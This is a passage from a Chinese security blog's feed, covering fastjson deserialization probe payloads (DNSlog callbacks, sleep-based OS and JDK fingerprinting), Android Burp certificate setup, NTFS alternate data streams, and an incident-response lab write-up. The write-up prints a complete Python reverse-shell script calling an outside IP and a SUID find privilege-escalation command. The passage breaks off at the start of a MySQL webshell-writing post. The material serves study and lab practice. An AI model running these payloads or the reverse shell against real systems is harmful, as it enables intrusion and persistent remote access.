alt="image-20240905224846071"></p><p>这里直接列出文章需要满足的报错条件：</p><ul><li>当代码使用 <code>JSON.parseObject(json , clazz)</code> 指定期望类的方式去解析 JSON，且 clazz 不能为 fastjson 已设定的大部分类型，如“Hashmap”、“ArrayList”</li><li>当使用 <code>JSON.parse(json)</code> 不指定期望类的时候可以通过 AutoCloseable 来触发</li></ul><p>比如这样：</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span>   <span class="hljs-comment">//该方法尝试了一下直到1.2.80都还可以探测出</span><br> <br><span class="hljs-comment">//下面这个据说也能探测，但是该靶场没有成功</span><br><span class="hljs-punctuation">[</span><span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409052252040.png" alt="image-20240905225213882"></p><p><strong>探测DNS</strong></p><p>参考文章：<a href="https://blog.csdn.net/why811/article/details/133679673">https://blog.csdn.net/why811/article/details/133679673</a></p><p>DNS探测主要是为了探测是否为fastjson</p><p>这里dnslog可以直接用yakit生成</p><p><img src="https://cdn.clown2024.cn/202409051322413.png" alt="image-20240905132158243"></p><p>这里纯收集payload复现了，没找到什么分析的文章</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetAddress&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;muwoiavfqk.dgrh3.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><blockquote><p>不过这个gadget在1.2.48禁止了</p></blockquote><p>1.2.68版本结果</p><p><img src="https://cdn.clown2024.cn/202409051325045.png" alt="image-20240905132543897"></p><p>笑死yakit的dnslog没记录出来，dnslog平台的可以</p><p><img src="https://cdn.clown2024.cn/202409051337491.png" alt="image-20240905133750354"></p><p><img src="https://cdn.clown2024.cn/202409051337590.png" alt="image-20240905133730460"></p><p>各种payload</p><figure class="highlight json"><table><tr><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet4Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet6Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-comment">//下面是一些畸形payload，会报错但是也能触发dnslog</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;aaa&quot;</span><span class="hljs-punctuation">&#125;</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br>Set<span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.URL&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;bolvv3.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>这里可能有时候探测出现问题，说type not match，其实原因是，有的开发在使用fastjson解析请求时会使用Spring的@RequestBody注释，告诉解析引擎，我需要的是一个User类对象</p><p>最外层一定是数组或者对象，不要加@type，然后将Payload作为其中一个键值，比如：</p><figure class="highlight perl"><table><tr><td class="code"><pre><code class="hljs perl">&#123;<br><span class="hljs-string">&quot;xxx&quot;</span>: &#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.InetAddress&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;dnslog&quot;</span>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样写通常就不会有type not match的</p><p><code>下面的探测是存在fastjson并且可以加载字节码的情况，纯粹记录没有尝试过</code></p><h2 id="操作系统探测"><a href="#操作系统探测" class="headerlink" title="操作系统探测"></a>操作系统探测</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">osName</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase();<br>        System.out.println(osName);<br>        <span class="hljs-keyword">if</span> (osName.contains(<span class="hljs-string">&quot;nix&quot;</span>) || osName.contains(<span class="hljs-string">&quot;nux&quot;</span>) || osName.contains(<span class="hljs-string">&quot;mac&quot;</span>))<br>        &#123;<br>            Thread.sleep(<span class="hljs-number">3000</span>);<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (osName.contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>            Thread.sleep(<span class="hljs-number">6000</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            Thread.sleep(<span class="hljs-number">9000</span>);<br>        &#125;<br></code></pre></td></tr></table></figure><h2 id="中间件探测"><a href="#中间件探测" class="headerlink" title="中间件探测"></a>中间件探测</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">stackTraces</span> <span class="hljs-operator">=</span> Thread.getAllStackTraces();<br>        <span class="hljs-keyword">for</span> (Map.Entry entry : stackTraces.entrySet()) &#123;<br>            StackTraceElement[] stackTraceElements = entry.getValue();<br>            <span class="hljs-keyword">for</span> (StackTraceElement element : stackTraceElements) &#123;<br><span class="hljs-comment">// element.getClassName().contains(&quot;org.springframework.web&quot;</span><br>                <span class="hljs-keyword">if</span> (element.getClassName().contains(<span class="hljs-string">&quot;org.apache.catalina.core&quot;</span>)) &#123;<br>                    Thread.sleep(<span class="hljs-number">5000</span>);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><h2 id="探测jdk版本"><a href="#探测JDK版本" class="headerlink" title="探测JDK版本"></a>探测JDK版本</h2><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 获取 Java 版本</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">javaVersion</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;java.version&quot;</span>);<br><span class="hljs-comment">// 解析主版本号</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">majorVersion</span> <span class="hljs-operator">=</span> Integer.parseInt(javaVersion.split(<span class="hljs-string">&quot;\\.&quot;</span>)[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">// 进⾏版本判断</span><br>        <span class="hljs-keyword">switch</span> (majorVersion) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>                Thread.sleep(<span class="hljs-number">1000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>                Thread.sleep(<span class="hljs-number">2000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>                Thread.sleep(<span class="hljs-number">3000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>                Thread.sleep(<span class="hljs-number">4000</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                Thread.sleep(<span class="hljs-number">5000</span>);<br>                <span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;fastjson介绍&quot;&gt;&lt;a href=&quot;#fastjson介绍&quot; class=&quot;headerlink&quot; title=&quot;fastjson介绍&quot;&gt;&lt;/a&gt;fastjson介绍&lt;/h1&gt;&lt;p&gt;官方github地址：&lt;a href=&quot;https://github.com</summary>
      
    
    
    
    <category term="java漏洞" scheme="https://clowsman.github.io/categories/java%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>flask内存马学习</title>
    <link href="https://clowsman.github.io/2024/08/17/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/08/17/flask%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-08-17T08:42:44.000Z</published>
    <updated>2024-08-17T09:56:06.004Z</updated>
    
    
    
    
    
    <category term="内存马" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>APP渗透抓包环境配置</title>
    <link href="https://clowsman.github.io/2024/08/15/APP%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>https://clowsman.github.io/2024/08/15/APP%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2024-08-15T10:52:02.000Z</published>
    <updated>2024-08-15T17:34:27.424Z</updated>
    
    <content type="html"><![CDATA[<h1 id="模拟器代理设置"><a href="#模拟器代理设置" class="headerlink" title="模拟器代理设置"></a>模拟器代理设置</h1><p>这里用雷电模拟器</p><p>ipconfig查看一下本机的IP</p><p><img src="https://cdn.clown2024.cn/202408151921468.png" alt="image-20240815192142415"></p><p>然后在burp添加一个新的代理</p><p><img src="https://cdn.clown2024.cn/202408151922834.png" alt="image-20240815192241797"></p><p>然后模拟器也自定义该ip地址</p><p><img src="https://cdn.clown2024.cn/202408151925440.png" alt="image-20240815192521373"></p><h1 id="证书安装"><a href="#证书安装" class="headerlink" title="证书安装"></a>证书安装</h1><p>这里如果要抓https还需要安装一下burp证书，参考文章：<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/06.%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%90%84%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%8A%93%E5%8C%85/">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/06.%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%90%84%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%8A%93%E5%8C%85/</a></p><blockquote><p>但是Android 从 7.0 开始，系统不再信任用户 CA 证书，安装证书的方式就麻烦一点</p></blockquote><p>首先访问burp的监听地址下载证书</p><p><img src="https://cdn.clown2024.cn/202408151927057.png" alt="image-20240815192723003"></p><p>打开文件管理器可以看到证书</p><p><img src="https://cdn.clown2024.cn/202408151928262.png" alt="image-20240815192845208"></p><p>然后用kali里的工具openssl计算证书哈希值</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">openssl x509 -inform der -subject_hash_old -<span class="hljs-keyword">in</span> cacert.der -noout<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408151939380.png" alt="image-20240815193917347"></p><p>将证书名改为<code>&lt;hash&gt;.0</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> cacert.der 9a5ba575.0<br></code></pre></td></tr></table></figure><p>然后用<code>MT管理器</code>将其移动到<code>/system/etc/security/cacerts/</code>目录</p><blockquote><p>雷电9这里会出现挂载失败无法移动的情况</p><p><img src="https://cdn.clown2024.cn/202408151952697.png" alt="image-20240815195250615"></p><p>要在设置–&gt;性能设置修改一下vmdk可写</p><p><img src="https://cdn.clown2024.cn/202408151954575.png" alt="image-20240815195457525"></p></blockquote><p>难绷的还是不行，换网易的MuMu模拟器就好了，这雷电模拟器什么毛病🥲</p><p>流程和上面一样，参考文章：<a href="https://blog.csdn.net/shr592833253/article/details/139395912">用手机模拟器进行APP渗透测试抓包(超详细版)_手机模拟器抓包-CSDN博客</a></p><p>证书放过去的时候要记得有足够权限，有些可能不够，可以直接用mt改</p><p><img src="https://cdn.clown2024.cn/202408152317058.png" alt="image-20240815231730970"></p><p>然后把&#x2F;system这个目录的权限也改成777</p><p><img src="https://cdn.clown2024.cn/202408152319326.png" alt="image-20240815231905270"></p><p>然后就可以正常抓包也没有证书问题了</p><p><img src="https://cdn.clown2024.cn/202408152321450.png" alt="image-20240815232138363"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;模拟器代理设置&quot;&gt;&lt;a href=&quot;#模拟器代理设置&quot; class=&quot;headerlink&quot; title=&quot;模拟器代理设置&quot;&gt;&lt;/a&gt;模拟器代理设置&lt;/h1&gt;&lt;p&gt;这里用雷电模拟器&lt;/p&gt;
&lt;p&gt;ipconfig查看一下本机的IP&lt;/p&gt;
&lt;p&gt;&lt;img src=</summary>
      
    
    
    
    <category term="app渗透" scheme="https://clowsman.github.io/categories/app%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透" scheme="https://clowsman.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>NTFS数据流隐写</title>
    <link href="https://clowsman.github.io/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/"/>
    <id>https://clowsman.github.io/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/</id>
    <published>2024-07-12T12:39:30.000Z</published>
    <updated>2024-07-15T06:42:10.915Z</updated>
    
    <content type="html"><![CDATA[<p>这是在前文学习mysql提权的时候遇到的利用数据流写文件，以前有点印象但不是很深，这里记录一下。</p><h1 id="ntfs数据流介绍"><a href="#NTFS数据流介绍" class="headerlink" title="NTFS数据流介绍"></a>NTFS数据流介绍</h1><p>在NTFS文件系统中存在着NTFS备用数据流（Alternate Data Streams，简称ADS），这是NTFS磁盘格式的特性之一。每一个文件，都有着主文件流和非主文件流，主文件流能够直接看到；而非主文件流寄宿于主文件流中，无法直接读取，这个非主文件流就是NTFS备用数据流。</p><p>ADS的作用在于，它允许一个文件携带着附加的信息。例如，IE浏览器下载文件时，会向文件添加一个数据流，标记该文件来源于外部，即带有风险，那么，在用户打开文件时，就会弹出文件警告提示。再如，在网址收藏中，也会附加一个favicon数据流以存放网站图标。</p><p>ADS也被用于一些恶意文件隐藏自身,作为后门。</p><h1 id="ads应用"><a href="#ADS应用" class="headerlink" title="ADS应用"></a>ADS应用</h1><p>这里写一个隐藏文本来看看，首先创建一个空的example.txt，然后写入ADS，这里写入一个字符串</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;123&quot;</span> &gt; example.txt:config <span class="hljs-comment">#这里要用cmd，用powershell会报错</span><br></code></pre></td></tr></table></figure><p>然后直接打开文件还是空的</p><p><img src="http://cdn.clown2024.cn/202407151442538.png" alt="image-20240713015237491"></p><p>想要查看ADS的话可以这样</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">notepad example.txt:config<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151442539.png" alt="image-20240713015437701"></p><p>还有用下面命令查看该文件所有的ADS</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dir</span> example.txt /R<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151442540.png" alt="image-20240713015550479"></p><p>ADS可以写任何东西，包括图片、音频、视频等，所以可以用来隐藏后门，在Windows XP中，可执行文件可以隐藏并且被执行。但是，微软已经发现了这个问题并进行了修复，目前在Windows Vista及后续系统中已经无法直接运行ADS中的可执行文件了。</p><p>可以直接这样写入文件，其他文件同理</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">type</span> <span class="hljs-number">01</span>.txt &gt; example.txt:<span class="hljs-number">01</span>.txt<br><span class="hljs-built_in">type</span> <span class="hljs-number">01</span>.txt &gt;&gt; example.txt:<span class="hljs-number">01</span>.txt<br></code></pre></td></tr></table></figure><p>ADS数据流文件有三种删除方式。一是直接<strong>删除宿主</strong>文件，二是将宿主文件<strong>移到</strong>FAT32<strong>等非</strong>NTFS<strong>分区中</strong>；三是利用<strong>工具软件</strong>，如IceSword、Ntfs Streams Editor删除。</p><p>Ntfs Streams Editor删除命令如下：</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">streams.exe -d &lt;File&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这是在前文学习mysql提权的时候遇到的利用数据流写文件，以前有点印象但不是很深，这里记录一下。&lt;/p&gt;
&lt;h1 id=&quot;ntfs数据流介绍&quot;&gt;&lt;a href=&quot;#NTFS数据流介绍&quot; class=&quot;headerlink&quot; title=&quot;NTFS数据流介绍&quot;&gt;&lt;/a&gt;NTF</summary>
      
    
    
    
    <category term="杂七杂八" scheme="https://clowsman.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
    <category term="杂七杂八" scheme="https://clowsman.github.io/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
  </entry>
  
  <entry>
    <title>玄机应急响应靶场-第三章</title>
    <link href="https://clowsman.github.io/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/"/>
    <id>https://clowsman.github.io/2024/07/12/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA-%E7%AC%AC%E4%B8%89%E7%AB%A0/</id>
    <published>2024-07-12T07:53:07.000Z</published>
    <updated>2024-07-15T06:53:06.252Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h1><p>靶机简介</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ssh root@env.xj.edisec.net -p  密码  xjqxwcyc<br>1.黑客隐藏的隐藏的文件 完整路径md5<br>2.黑客隐藏的文件反弹shell的ip+端口 &#123;ip:port&#125;<br>3.黑客提权所用的命令 完整路径的md5 flag&#123;md5&#125; <br>4.黑客尝试注入恶意代码的工具完整路径md5<br>5.使用命令运行 ./x.xx 执行该文件  将查询的 Exec****** 值 作为flag提交 flag&#123;/xxx/xxx/xxx&#125;<br></code></pre></td></tr></table></figure><p>这里看了一下web目录没什么东西，直接用D盾全盘查杀一下</p><blockquote><p>这里挂载要指定端口，指定端口的形式是这样的：\sshfs.r\username@remote_ip!port\</p></blockquote><p>emmm但是卡住了扫不出来东西</p><p><img src="http://cdn.clown2024.cn/202407151452447.png" alt="image-20240712163333073"></p><p>最后是在&#x2F;tmp目录下发现了一个隐藏文件，里面有python脚本&#x2F;tmp&#x2F;.temp&#x2F;libprocesshider&#x2F;1.py</p><p><img src="http://cdn.clown2024.cn/202407151452448.png" alt="image-20240712162238473"></p><p>flag{109ccb5768c70638e24fb46ee7957e37}</p><p>其脚本内容</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><br><span class="hljs-keyword">import</span> socket,subprocess,os,sys, time<br><br>pidrg = os.fork()<br><span class="hljs-keyword">if</span> pidrg &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br>os.chdir(<span class="hljs-string">&quot;/&quot;</span>)<br>os.setsid()<br>os.umask(<span class="hljs-number">0</span>)<br>drgpid = os.fork()<br><span class="hljs-keyword">if</span> drgpid &gt; <span class="hljs-number">0</span>:<br>        sys.exit(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">try</span>:<br>                sys.stdout.flush()<br>                sys.stderr.flush()<br>                fdreg = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/dev/null&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>                sys.stdout = fdreg<br>                sys.stderr = fdreg<br>                sdregs=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>                sdregs.connect((<span class="hljs-string">&quot;114.114.114.121&quot;</span>,<span class="hljs-number">9999</span>))<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">0</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">1</span>)<br>                os.dup2(sdregs.fileno(),<span class="hljs-number">2</span>)<br>                p=subprocess.call([<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-i&quot;</span>])<br>                sdregs.close()<br>        <span class="hljs-keyword">except</span> Exception:<br>                <span class="hljs-keyword">pass</span><br>        time.sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>其反弹shell的ip和端口就是上面代码中的</p><p>flag{114.114.114.121:9999}</p><blockquote><p>一开始找到一个1.sh的脚本，里面是一个bash反弹shell但是那个玩意不是flag，不知道是不是环境没怎么改。。。</p></blockquote><p>查看黑客的提权命令，先看&#x2F;etc&#x2F;passwd</p><p><img src="http://cdn.clown2024.cn/202407151452449.png" alt="image-20240712162658912"></p><p>有个ctf用户，切换到该用户执行下面命令找是否能够suid提权</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452450.png" alt="image-20240712162931598"></p><p>发现find命令就能提权</p><p>其提权命令如下：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">/usr/bin/find . -<span class="hljs-built_in">exec</span> /bin/sh \; -quit<br></code></pre></td></tr></table></figure><p>flag{7fd5884f493f4aaf96abee286ee04120}</p><blockquote><p>emmm没想明白这个思路是怎么来的，看别人的wp，难道提权一定是suid吗😥</p></blockquote><p>然后就是找注入代码的恶意工具，这里用下面这个命令查找</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">find / -name <span class="hljs-string">&#x27;.*&#x27;</span> 2&gt;/dev/null|grep -v <span class="hljs-string">&#x27;sys&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452451.png" alt="image-20240712164100081"></p><p>搜索可以知道这是一个注入工具：<a href="https://cn-sec.com/archives/2563485.html">https://cn-sec.com/archives/2563485.html</a></p><blockquote><p>Cymothoa是一款隐秘的后门工具，通过向目标主机上活跃的进程注入恶意代码来执行后门工作，这也反向说明了，实际上Cymothoa后门会拥有和原进程相同的权限，且Cymothoa是通过向系统进程注入shellcode去执行后门，所以不会像以前写过的许多后门一样创建自己的进程，这使得它的隐蔽性提高了很多。</p></blockquote><p>所以其工具路径如下：&#x2F;opt&#x2F;.cymothoa-1-beta&#x2F;cymothoa</p><p>flag{087c267368ece4fcf422ff733b51aed9}</p><p>最后执行一下这个1.py的脚本查询一下网络连接</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">python3 ./1.py<br>netstat -pantu<br><span class="hljs-built_in">cat</span> /proc/563/cmdline<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151452452.png" alt="image-20240712165626986"></p><p>然后找到一个软链接，这个就是flag(没懂跟题目描述的步骤有什么关系</p><p>flag{&#x2F;usr&#x2F;bin&#x2F;python3.4}</p><blockquote><p>说实话是在没看懂这里是什么意思，看的别人的wp，有点意义不明。。。</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;linux权限维持&quot;&gt;&lt;a href=&quot;#Linux权限维持&quot; class=&quot;headerlink&quot; title=&quot;Linux权限维持&quot;&gt;&lt;/a&gt;Linux权限维持&lt;/h1&gt;&lt;p&gt;靶机简介&lt;/p&gt;
&lt;figure class=&quot;highlight plaintex</summary>
      
    
    
    
    <category term="应急响应" scheme="https://clowsman.github.io/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
    
    <category term="应急响应" scheme="https://clowsman.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>mysql提权</title>
    <link href="https://clowsman.github.io/2024/07/12/mysql%E6%8F%90%E6%9D%83/"/>
    <id>https://clowsman.github.io/2024/07/12/mysql%E6%8F%90%E6%9D%83/</id>
    <published>2024-07-11T17:22:48.000Z</published>
    <updated>2024-07-15T06:41:45.285Z</updated>
    
    <content type="html"><![CDATA[<p>参考文章：<a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><h1 id="权限获取"><a href="#权限获取" class="headerlink" title="权限获取"></a>权限获取</h1><p>要提权之前首先就要拿到mysql的权限，这里大佬的文章已经说的很详细了，我就记录一些写shell相关的知识</p><p><strong>into outfile写shell</strong></p><p>需要load_file () 开启 即 secure_file_priv 无限制</p><p>可以通过下面命令查看</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">show global variables like <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br></code></pre></td></tr></table></figure><table><thead><tr><th>Value</th><th>说明</th></tr></thead><tbody><tr><td>NULL</td><td>不允许导入或导出</td></tr><tr><td>&#x2F;tmp</td><td>只允许在 &#x2F;tmp 目录导入导出</td></tr><tr><td>空</td><td>不限制目录</td></tr></tbody></table><blockquote><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p><p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p></blockquote><p><strong>日志写shell</strong></p><p>可以下面命令查看日志位置</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">SHOW VARIABLES LIKE <span class="hljs-string">&#x27;general%&#x27;</span>;<br><br>+------------------+---------------------------------+<br>| Variable_name    | Value                           |<br>+------------------+---------------------------------+<br>| general_log      | OFF                             |<br>| general_log_file | /var/lib/mysql/c1595d3a029a.<span class="hljs-built_in">log</span> |<br>+------------------+---------------------------------+<br></code></pre></td></tr></table></figure><p><code>general_log</code> 默认关闭，开启它可以记录用户输入的每条命令，会把其保存在对应的日志文件中。</p><p>我们可以自己修改日志文件位置，这样就可以写shell进去了</p><figure class="highlight 